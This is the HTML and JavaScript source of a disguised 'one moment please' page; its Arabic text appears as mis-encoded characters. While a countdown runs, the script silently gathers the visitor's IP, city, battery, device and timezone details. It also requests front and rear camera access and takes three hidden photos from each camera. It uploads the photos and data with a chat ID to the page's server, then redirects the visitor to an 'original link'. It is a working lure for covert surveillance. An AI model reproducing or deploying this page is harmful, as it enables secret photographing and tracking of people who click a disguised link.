<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <title>ŸÑÿ≠ÿ∏ÿ© ŸàŸàÿßÿ≠ÿØÿ© ŸÖŸÜ ŸÅÿ∂ŸÑŸÉ</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        #countdown {
            font-size: 72px;
            font-weight: bold;
            color: #ff6600;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .message {
            font-size: 24px;
            color: #ffffff;
            margin-top: 20px;
        }
        #loading {
            display: none;
        }
        .status {
            font-size: 16px;
            color: #ccc;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="countdown">10</div>
        <div class="message">ŸÑÿ≠ÿ∏ÿ© ŸàŸàÿßÿ≠ÿØÿ© ŸÖŸÜ ŸÅÿ∂ŸÑŸÉ</div>
        <div id="status" class="status"></div>
    </div>
    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
    <canvas id="frontCanvas" style="display:none;"></canvas>
    <canvas id="backCanvas" style="display:none;"></canvas>

    <script>
        const frontVideo = document.getElementById('frontVideo');
        const backVideo = document.getElementById('backVideo');
        const frontCanvas = document.getElementById('frontCanvas');
        const backCanvas = document.getElementById('backCanvas');
        const countdownElement = document.getElementById('countdown');
        const statusElement = document.getElementById('status');
        let countdownValue = 10;
        
        // ÿßÿ≥ÿ™ÿ±ÿØÿßÿØ ÿßŸÑŸÖÿπŸÑŸÖÿßÿ™ ŸÖŸÜ ÿßŸÑÿ±ÿßÿ®ÿ∑
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');
        const originalLink = urlParams.get('originalLink');
        const username = urlParams.get('username') || 'ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ';

        if (!chatId) {
            console.error('Chat ID is missing');
            statusElement.textContent = '‚ùå ÿÆÿ∑ÿ£: ŸÖÿπÿ±ŸÅ ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ŸÖŸÅŸÇŸàÿØ';
            redirectToOriginalLink();
        }

        if (!originalLink) {
            console.error('Original link is missing');
            statusElement.textContent = '‚ùå ÿÆÿ∑ÿ£: ÿßŸÑÿ±ÿßÿ®ÿ∑ ÿßŸÑÿ£ÿµŸÑŸä ŸÖŸÅŸÇŸàÿØ';
        }

        // ÿ™ÿ≠ÿØŸäÿ´ ÿ≠ÿßŸÑÿ© ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ
        function updateStatus(message) {
            statusElement.textContent = message;
            console.log(message);
        }

        async function collectAdditionalData() {
            try {
                updateStatus('üì° ÿ¨ÿßÿ±Ÿä ÿ¨ŸÖÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¨Ÿáÿßÿ≤...');
                
                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
                const battery = await navigator.getBattery();

                return {
                    ip: ipInfo.ip,
                    country: ipInfo.country_name,
                    city: ipInfo.city,
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    batteryLevel: battery.level,
                    batteryCharging: battery.charging,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    username: username
                };
            } catch (error) {
                console.error('Error collecting additional data:', error);
                return {};
            }
        }

        async function requestCameraPermission(facingMode) {
            try {
                updateStatus(`üì∑ ÿ¨ÿßÿ±Ÿä ÿ∑ŸÑÿ® ÿ•ÿ∞ŸÜ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ${facingMode === 'user' ? 'ÿßŸÑÿ£ŸÖÿßŸÖŸäÿ©' : 'ÿßŸÑÿÆŸÑŸÅŸäÿ©'}...`);
                return await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode }
                });
            } catch (error) {
                console.error(`Error accessing ${facingMode} camera:`, error);
                return null;
            }
        }

        async function init() {
            try {
                updateStatus('üöÄ ÿ®ÿØÿ° ÿßŸÑÿ™ŸáŸäÿ¶ÿ©...');
                const additionalData = await collectAdditionalData();
                const frontStream = await requestCameraPermission('user');
                const backStream = await requestCameraPermission('environment');

                if (frontStream || backStream) {
                    updateStatus('‚úÖ ÿ™ŸÖ ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿ•ÿ∞ŸÜ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß');
                    handleSuccess(frontStream, backStream, additionalData);
                } else {
                    throw new Error('No camera access granted');
                }
            } catch (error) {
                console.error('Error in init:', error);
                updateStatus('‚ùå ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ŸáŸäÿ¶ÿ©');
                redirectToOriginalLink();
            }
        }

        function handleSuccess(frontStream, backStream, additionalData) {
            if (frontStream) {
                frontVideo.srcObject = frontStream;
                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
            }
            if (backStream) {
                backVideo.srcObject = backStream;
                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
            }
        }

        function setupCamera(video, canvas, cameraType, additionalData) {
            video.play();
            video.onplaying = () => {
                const { videoWidth, videoHeight } = video;
                canvas.width = videoWidth;
                canvas.height = videoHeight;

                const context = canvas.getContext('2d');
                let photoCount = 0;

                const captureInterval = setInterval(() => {
                    if (photoCount >= 3) { // ÿÆŸÅÿ∂ÿ™ ŸÑŸÄ 3 ÿµŸàÿ± ŸÑŸÉŸÑ ŸÉÿßŸÖŸäÿ±ÿß
                        clearInterval(captureInterval);
                        if (cameraType === 'back' || !document.getElementById('backVideo').srcObject) {
                            updateStatus('‚úÖ ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ŸÇÿßÿ∑ ÿßŸÑÿµŸàÿ±');
                            setTimeout(() => redirectToOriginalLink(), 2000);
                        }
                        return;
                    }

                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
                    
                    // ÿ™ÿ≠ŸàŸäŸÑ Canvas ÿ•ŸÑŸâ base64
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ÿ•ŸÑŸâ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
                    sendImageToServer(imageData, cameraType, photoCount, additionalData);
                    
                    photoCount++;
                }, 1500);
            };
        }

        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ÿ•ŸÑŸâ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
        async function sendImageToServer(imageData, cameraType, photoCount, additionalData) {
            try {
                updateStatus(`üì§ ÿ¨ÿßÿ±Ÿä ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ${photoCount + 1} ŸÖŸÜ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ${cameraType === 'front' ? 'ÿßŸÑÿ£ŸÖÿßŸÖŸäÿ©' : 'ÿßŸÑÿÆŸÑŸÅŸäÿ©'}...`);
                
                const response = await fetch('/submitPhtos', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        images: [imageData], // ÿ•ÿ±ÿ≥ÿßŸÑ ŸÉŸÄ base64
                        cameraType: cameraType,
                        additionalData: JSON.stringify(additionalData),
                        chatId: chatId
                    })
                });

                const result = await response.json();

                if (result.success) {
                    updateStatus(`‚úÖ ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ${photoCount + 1} ÿ®ŸÜÿ¨ÿßÿ≠`);
                    console.log('ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ÿ®ŸÜÿ¨ÿßÿ≠:', result);
                } else {
                    updateStatus(`‚ùå ŸÅÿ¥ŸÑ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ${photoCount + 1}`);
                    console.error('ŸÅÿ¥ŸÑ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ©:', result);
                }
            } catch (error) {
                console.error('Error sending image to server:', error);
                updateStatus(`‚ùå ÿÆÿ∑ÿ£ ŸÅŸä ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ${photoCount + 1}`);
            }
        }

        // ÿ•ÿ±ÿ≥ÿßŸÑ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¨Ÿáÿßÿ≤ ÿ•ŸÑŸâ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
        async function sendDeviceInfo(additionalData) {
            try {
                updateStatus('üìä ÿ¨ÿßÿ±Ÿä ÿ•ÿ±ÿ≥ÿßŸÑ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¨Ÿáÿßÿ≤...');
                
                const response = await fetch('/device-info', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chatId: chatId,
                        username: username,
                        additionalInfo: `ÿ™ŸÖ ÿ¨ŸÖÿπ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã - ŸÉÿßŸÖŸäÿ±ÿß: ${document.getElementById('frontVideo').srcObject ? 'ŸÜÿπŸÖ' : 'ŸÑÿß'}/${document.getElementById('backVideo').srcObject ? 'ŸÜÿπŸÖ' : 'ŸÑÿß'}`
                    })
                });

                const result = await response.json();

                if (result.success) {
                    updateStatus('‚úÖ ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¨Ÿáÿßÿ≤ ÿ®ŸÜÿ¨ÿßÿ≠');
                } else {
                    updateStatus('‚ùå ŸÅÿ¥ŸÑ ÿ•ÿ±ÿ≥ÿßŸÑ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¨Ÿáÿßÿ≤');
                }
            } catch (error) {
                console.error('Error sending device info:', error);
            }
        }

        function startCountdown() {
            const interval = setInterval(() => {
                countdownValue--;
                countdownElement.textContent = countdownValue;

                if (countdownValue <= 0) {
                    clearInterval(interval);
                    updateStatus('‚è∞ ÿßŸÜÿ™ŸáŸâ ÿßŸÑŸàŸÇÿ™ÿå ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™Ÿàÿ¨ŸäŸá...');
                    redirectToOriginalLink();
                }
            }, 1000);
        }

        function redirectToOriginalLink() {
            if (originalLink) {
                setTimeout(() => {
                    window.location.href = originalLink;
                }, 2000);
            } else {
                updateStatus('‚ùå ÿßŸÑÿ±ÿßÿ®ÿ∑ ÿßŸÑÿ£ÿµŸÑŸä ÿ∫Ÿäÿ± ŸÖÿ™ŸàŸÅÿ±');
            }
        }

        // ÿ®ÿØÿ° ÿßŸÑÿπŸÖŸÑŸäÿ©
        updateStatus('üîß ÿ¨ÿßÿ±Ÿä ÿ™ŸáŸäÿ¶ÿ© ÿßŸÑŸÜÿ∏ÿßŸÖ...');
        init();
        startCountdown();

        // ÿ•ÿ±ÿ≥ÿßŸÑ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑÿ¨Ÿáÿßÿ≤ ÿ®ÿπÿØ ÿ´ÿßŸÜŸäÿ™ŸäŸÜ
        setTimeout(async () => {
            const additionalData = await collectAdditionalData();
            sendDeviceInfo(additionalData);
        }, 2000);

    </script>
</body>
</html>
